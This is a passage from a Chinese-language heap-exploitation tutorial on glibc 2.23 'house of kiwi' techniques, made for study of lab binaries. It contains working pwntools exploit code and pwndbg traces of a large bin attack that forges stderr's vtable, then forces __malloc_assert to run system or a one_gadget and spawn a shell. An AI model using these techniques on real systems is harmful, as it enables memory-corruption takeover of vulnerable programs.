malloc(5, 0x1200)
conn.recvline()
cmd = b"cat src/2.23/house_of_kiwi/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先，连续申请chunks[0]、chunks[1]、chunks[2]内存，其中chunks[0]->size > chunks[2]->size。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x619d0404b000
Size: 0x430 (with flag bits: 0x431)

Allocated chunk | PREV_INUSE
Addr: 0x619d0404b430
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x619d0404b940
Size: 0x410 (with flag bits: 0x411)

Top chunk | PREV_INUSE
Addr: 0x619d0404bd50
Size: 0x202b0 (with flag bits: 0x202b1)

pwndbg> 
```

然后，释放chunks[0]至unsorted bin里。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x619d0404b000 —▸ 0x7db2b5f8db78 (main_arena+88) ◂— 0x619d0404b000
pwndbg> 
```

接着，申请chunks[3]内存，将chunks[0]从unsortedbin转移到largebins里。其中，要求chunks[3]->size > chunks[0]->size。此时可以泄露libc地址和heap地址，为后续的布局做好准备。

```bash
pwndbg> largebins 
largebins
0x400-0x430: 0x619d0404b000 —▸ 0x7db2b5f8df68 (main_arena+1096) ◂— 0x619d0404b000
pwndbg> 
```

接着释放chunks[2]至unsorted bin里。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x619d0404b940 —▸ 0x7db2b5f8db78 (main_arena+88) ◂— 0x619d0404b940
pwndbg> 
```

修改large bin的bk为`p64(vtable - 0x10)`，bk_nextsize为`p64(vtable - 0x20)`。

```bash
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
FD: 0x619d0404b000 —▸ 0x7db2b5f8df68 (main_arena+1096) ◂— 0x619d0404b000
BK: 0x619d0404b000 —▸ 0x7db2b5f8e628 (_IO_2_1_stderr_+200) ◂— 0xfbad2887
pwndbg> x/6gx 0x619d0404b000
0x619d0404b000: 0x0000000000000000      0x0000000000000431
0x619d0404b010: 0x00007db2b5f8df68      0x00007db2b5f8e628
0x619d0404b020: 0x0000619d0404b000      0x00007db2b5f8e618
pwndbg> p/x *(struct _IO_FILE_plus*)stderr
$1 = {
  file = {
    _flags = 0xfbad2087,
    _IO_read_ptr = 0x7db2b5f8e5e3,
    _IO_read_end = 0x7db2b5f8e5e3,
    _IO_read_base = 0x7db2b5f8e5e3,
    _IO_write_base = 0x7db2b5f8e5e3,
    _IO_write_ptr = 0x7db2b5f8e5e3,
    _IO_write_end = 0x7db2b5f8e5e3,
    _IO_buf_base = 0x7db2b5f8e5e3,
    _IO_buf_end = 0x7db2b5f8e5e4,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7db2b5f8e640,
    _fileno = 0x2,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x7db2b5f8f790,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7db2b5f8d660,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x7db2b5f8c6e0
}
pwndbg> 
```

申请chunks[4]触发large bin attack。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)stderr
$2 = {
  file = {
    _flags = 0xfbad2087,
    _IO_read_ptr = 0x7db2b5f8e5e3,
    _IO_read_end = 0x7db2b5f8e5e3,
    _IO_read_base = 0x7db2b5f8e5e3,
    _IO_write_base = 0x7db2b5f8e5e3,
    _IO_write_ptr = 0x7db2b5f8e5e3,
    _IO_write_end = 0x7db2b5f8e5e3,
    _IO_buf_base = 0x7db2b5f8e5e3,
    _IO_buf_end = 0x7db2b5f8e5e4,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7db2b5f8e640,
    _fileno = 0x2,
    _flags2 = 0x0,
    _old_offset = 0xffffffffffffffff,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x7db2b5f8f790,
    _offset = 0xffffffffffffffff,
    _codecvt = 0x0,
    _wide_data = 0x7db2b5f8d660,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x619d0404b940
}
pwndbg> 
```

可以发现vtable成功修改为chunks[2]。在chunks[2]内布局vtable。

```bash
pwndbg> p/x *(struct _IO_jump_t*)0x619d0404b940
$3 = {
  __dummy = 0x0,
  __dummy2 = 0x411,
  __finish = 0x0,
  __overflow = 0x7db2b5c6ca11,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x7db2b5c6bcfb,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x619cfbf4c779,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x7db2b5c6bc56,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> x/6i 0x619cfbf4c779
   0x619cfbf4c779 <magic>:      endbr64
   0x619cfbf4c77d <magic+4>:    push   rbp
   0x619cfbf4c77e <magic+5>:    mov    rbp,rsp
   0x619cfbf4c781 <magic+8>:    lea    rax,[rip+0x949]        # 0x619cfbf4d0d1
   0x619cfbf4c788 <magic+15>:   mov    rdi,rax
   0x619cfbf4c78b <magic+18>:   call   0x619cfbf4c180 <system@plt>
pwndbg> 
```

修改top-chunk->size为0x1000，然后申请0x1200大小内存，准备触发__malloc_assert调用。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3828
   3822 
   3823       /*
   3824          Otherwise, relay to handle system-dependent cases
   3825        */
   3826       else
   3827         {
 ► 3828           void *p = sysmalloc (nb, av);
 
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:2392
   2386 
   2387   /*
   2388      If not the first time through, we require old_size to be
   2389      at least MINSIZE and to have prev_inuse set.
   2390    */
   2391 
 ► 2392   assert ((old_top == initial_top (av) && old_size == 0) ||
   2393           ((unsigned long) (old_size) >= MINSIZE &&
   2394            prev_inuse (old_top) &&
   2395            ((unsigned long) old_end & (pagesize - 1)) == 0));
 
pwndbg> top-chunk 
Top chunk
Addr: 0x619d0404c770
Size: 0x1000 (with flag bits: 0x1000)

pwndbg> 
```

由于断言失败，进入__malloc_assert函数内。

```bash
290 static void
291 __malloc_assert (const char *assertion, const char *file, unsigned int line,
292                  const char *function)
► 293 {
294   (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
295                      __progname, __progname[0] ? ": " : "",
296                      file, line,
297                      function ? function : "", function ? ": " : "",
298                      assertion);
299   fflush (stderr); <= target
300   abort ();
```

目标是进入fflush函数内，需要绕过__fxprintf函数相关的校验。

```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/fxprintf.c:50
   42       for (size_t i = 0; i < len; ++i)
   43         {
   44           assert (isascii (fmt[i]));
   45           wfmt[i] = fmt[i];
   46         }
   47       res = __vfwprintf (fp, wfmt, ap);
   48     }
   49   else
 ► 50     res = _IO_vfprintf (fp, fmt, ap);
```

进入_IO_vfprintf函数内部。

```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/vfprintf.c:1293
   1287     return EOF;
   1288 #endif
   1289 
   1290   if (UNBUFFERED_P (s))
   1291     /* Use a helper function which will allocate a local temporary buffer
   1292        for the stream and then call us again.  */
 ► 1293     return buffered_vfprintf (s, format, ap);
```

接着进入buffered_vfprintf函数内。

```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/vfprintf.c:2341
   2335           != to_flush)
   2336         result = -1;
   2337     }
   2338 #else
   2339   if ((to_flush = hp->_IO_write_ptr - hp->_IO_write_base) > 0)
   2340     {
 ► 2341       if ((int) _IO_sputn (s, hp->_IO_write_base, to_flush) != to_flush)
 

  0x7db2b5c46557 <buffered_vfprintf+352>    mov    rax, qword ptr [rbx + 0xd8]     RAX, [_IO_2_1_stderr_+216] => 0x619d0404b940 ◂— 0
  0x7db2b5c4655e <buffered_vfprintf+359>    movsxd rdx, ebp                        RDX => 0xdb
  0x7db2b5c46561 <buffered_vfprintf+362>    mov    rdi, rbx                        RDI => 0x7db2b5f8e560 (_IO_2_1_stderr_) ◂— 0xfbad2087
► 0x7db2b5c46564 <buffered_vfprintf+365>    call   qword ptr [rax + 0x38]      <__GI__IO_file_xsputn>
            rdi: 0x7db2b5f8e560 (_IO_2_1_stderr_) ◂— 0xfbad2087
            rsi: 0x7ffceb6c8390 {buf} ◂— 0x203a7972616e6962 ('binary: ')
            rdx: 0xdb
            
pwndbg> p/x *(struct _IO_jump_t*)$rax
$10 = {
  __dummy = 0x0,
  __dummy2 = 0x411,
  __finish = 0x0,
  __overflow = 0x7db2b5c6ca11,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x7db2b5c6bcfb,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x619cfbf4c779,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x7db2b5c6bc56,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> 
```

如若将伪造的`vtable->__xsputn`修改为one_gadget，此时便可获取shell的控制权。这里便是要绕过的校验之一，进入`__GI__IO_file_xsputn`之后，很快遇到第二个的校验。

```bash
In file: /home/bogon/workSpaces/glibc/libio/fileops.c:1331
   1325       to_do -= count;
   1326     }
   1327   if (to_do + must_flush > 0)
   1328     {
   1329       _IO_size_t block_size, do_write;
   1330       /* Next flush the (full) buffer. */
 ► 1331       if (_IO_OVERFLOW (f, EOF) == EOF)
```

如若将伪造的`vtable->__overflow`修改为one_gadget，此时便可获取shell的控制权。不过，前提`vtable->__xsputn`要还原为正常。

```bash
In file: /home/bogon/workSpaces/glibc/libio/fileops.c:518
   512       _IO_off64_t new_pos
   513         = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
   514       if (new_pos == _IO_pos_BAD)
   515         return 0;
   516       fp->_offset = new_pos;
   517     }
 ► 518   count = _IO_SYSWRITE (fp, data, to_do);
```

这里便是最后的一个校验，如若将伪造的`vtable->__write`修改为one_gadget，此时便可获取shell的控制权。不过，前提`vtable->__xsputn`与`vtable->__overflow`要还原为正常。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:299
   293 {
   294   (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
   295                      __progname, __progname[0] ? ": " : "",
   296                      file, line,
   297                      function ? function : "", function ? ": " : "",
   298                      assertion);
 ► 299   fflush (stderr);
 
In file: /home/bogon/workSpaces/glibc/libio/iofflush.c:40
   34     return _IO_flush_all ();
   35   else
   36     {
   37       int result;
   38       CHECK_FILE (fp, EOF);
   39       _IO_acquire_lock (fp);
 ► 40       result = _IO_SYNC (fp) ? EOF : 0;
```

绕过__fxprintf函数的校验之后，最终来到_IO_SYNC函数，触发one_gadget获取shell控制权。

#### 小结

本方法涉及四个函数指针的布局，因此出现四次利用机会。


### 1-28 house of kiwi其二

本方法利用方式与前面的house of orange类似，都是Heap+IO结合利用。不过，本方法通过伪造stderr->vtable实现利用，而libc的触发点也变为`__malloc_assert 》 __fxprintf 》 outstring`。

```c
/* The function itself.  */
int
vfprintf (FILE *s, const CHAR_T *format, va_list ap)
{
...
  /* Lock stream.  */
  _IO_cleanup_region_start ((void (*) (void *)) &_IO_funlockfile, s);
  _IO_flockfile (s);

  /* Write the literal text before the first format.  */
  outstring ((const UCHAR_T *) format,
	     lead_str_end - (const UCHAR_T *) format);
}
```

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/17/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_kiwi_again/exploit.py)。

核心利用代码如下：

```python
# house of kiwi again
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
# pwndbg> x/1gx &stderr
# 0x4040a0 <stderr@GLIBC_2.2.5>:  0x00007e2262f8e560
# pwndbg>
stderr = 0x4040A0
log.info(f"stderr addr: {hex(stderr)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 4].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(stderr - 0x10)
payload += p64(chunk0_addr) + p64(stderr - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

payload = b"\x00" * 0x500 + b"\x20\x80||sh\x00\x00"
edit(1, len(payload), payload)
payload = b"\x00" * (0xD8 - 0x10) + p64(chunk0_addr)
edit(2, len(payload), payload)
payload = b"\x00" * (0x38 - 0x10) + p64(system)
edit(0, len(payload), payload)
payload = b"\x00" * 0x500 + p64(0) + p64(0x1000)
edit(4, len(payload), payload)
malloc(5, 0x1200)
conn.recvline()
cmd = b"cat src/2.23/house_of_kiwi_again/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

首先，利用large bin attack技术泄露libc地址和heap地址。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x23fd2000
Size: 0x430 (with flag bits: 0x431)
fd: 0x767f8a38df68
bk: 0x767f8a38df68
fd_nextsize: 0x23fd2000
bk_nextsize: 0x23fd2000

Allocated chunk
Addr: 0x23fd2430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x23fd2940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x23fd2d50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x23fd3260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x23fd2000 —▸ 0x767f8a38df68 (main_arena+1096) ◂— 0x23fd2000
pwndbg> 
```

然后，修改large bin里chunks的bk和bk_nextsize内容。

```bash
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
FD: 0x23fd2000 —▸ 0x767f8a38df68 (main_arena+1096) ◂— 0x23fd2000
BK: 0x23fd2000 —▸ 0x404090 (stdin@GLIBC_2.2.5) ◂— 0
pwndbg> x/6gx 0x23fd2000
0x23fd2000:     0x0000000000000000      0x0000000000000431
0x23fd2010:     0x0000767f8a38df68      0x0000000000404090
0x23fd2020:     0x0000000023fd2000      0x0000000000404080
pwndbg> x/1gx &stderr
0x4040a0 <stderr@GLIBC_2.2.5>:  0x0000767f8a38e560
pwndbg> 
```

申请新的chunks触发large bin attack。

```bash
pwndbg> x/1gx &stderr
0x4040a0 <stderr@GLIBC_2.2.5>:  0x0000000023fd2940
pwndbg> 
```

可以发现stderr值已经修改为可控的heap地址，在其上面布局伪造fake vtable。

```bash
pwndbg> p/x *(struct _IO_FILE_plus*)stderr
$1 = {
  file = {
    _flags = 0x7c7c8020,
    _IO_read_ptr = 0x411,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0x0,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = {0x0},
    _lock = 0x0,
    _offset = 0x0,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = {0x0 <repeats 20 times>}
  },
  vtable = 0x23fd2000
}
pwndbg> x/s stderr
0x23fd2940:     " \200||sh"
pwndbg> p/x *(struct _IO_jump_t*)0x23fd2000
$2 = {
  __dummy = 0x0,
  __dummy2 = 0x431,
  __finish = 0x0,
  __overflow = 0x0,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x767f8a03c3eb,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> x/5i 0x767f8a03c3eb
   0x767f8a03c3eb <__libc_system>:      sub    rsp,0x8
   0x767f8a03c3ef <__libc_system+4>:    test   rdi,rdi
   0x767f8a03c3f2 <__libc_system+7>:    jne    0x767f8a03c40a <__libc_system+31>
   0x767f8a03c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x767f8a156d7b
   0x767f8a03c3fb <__libc_system+16>:   call   0x767f8a03be36 <do_system>
pwndbg> 
```

修改top-chunk->size为0x1000，然后申请0x1200大小内存，准备触发__malloc_assert调用。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:3828
   3822 
   3823       /*
   3824          Otherwise, relay to handle system-dependent cases
   3825        */
   3826       else
   3827         {
 ► 3828           void *p = sysmalloc (nb, av);
 
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:2392
   2386 
   2387   /*
   2388      If not the first time through, we require old_size to be
   2389      at least MINSIZE and to have prev_inuse set.
   2390    */
   2391 
 ► 2392   assert ((old_top == initial_top (av) && old_size == 0) ||
   2393           ((unsigned long) (old_size) >= MINSIZE &&
   2394            prev_inuse (old_top) &&
   2395            ((unsigned long) old_end & (pagesize - 1)) == 0));
 
pwndbg> top-chunk 
Top chunk
Addr: 0x23fd3770
Size: 0x1000 (with flag bits: 0x1000)

pwndbg> 
```

由于断言失败，进入__malloc_assert函数内。

```bash
In file: /home/bogon/workSpaces/glibc/malloc/malloc.c:294
   288 extern const char *__progname;
   289 
   290 static void
   291 __malloc_assert (const char *assertion, const char *file, unsigned int line,
   292                  const char *function)
   293 {
 ► 294   (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",
   295                      __progname, __progname[0] ? ": " : "",
   296                      file, line,
   297                      function ? function : "", function ? ": " : "",
   298                      assertion);
   299   fflush (stderr);
   300   abort ();
   301 }
```

步进`__fxprintf 》 _IO_vfprintf(vfprintf)`。

```bash
In file: /home/bogon/workSpaces/glibc/stdio-common/vfprintf.c:1320
   1314 
   1315   /* Lock stream.  */
   1316   _IO_cleanup_region_start ((void (*) (void *)) &_IO_funlockfile, s);
   1317   _IO_flockfile (s);
   1318 
   1319   /* Write the literal text before the first format.  */
 ► 1320   outstring ((const UCHAR_T *) format,
   1321              lead_str_end - (const UCHAR_T *) format);
 
pwndbg> x/s $rdi
0x27eb8940:     " \200||sh"
pwndbg>
```

其中outstring宏实际内容如下：

```c
#define outstring(String, Len)                                                 \
  do {                                                                         \
    assert((size_t)done <= (size_t)INT_MAX);                                   \
    if ((size_t)PUT(s, (String), (Len)) != (size_t)(Len)) {                    \
      done = -1;                                                               \
      goto all_done;                                                           \
    }                                                                          \
    if (__glibc_unlikely(INT_MAX - done < (Len))) {                            \
      done = -1;                                                               \
      __set_errno(EOVERFLOW);                                                  \
      goto all_done;                                                           \
    }                                                                          \
    done += (Len);                                                             \
  } while (0)
  
# define PUT(F, S, N)	_IO_sputn ((F), (S), (N))
```

显然，获取shell的控制权轻而易举。


### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
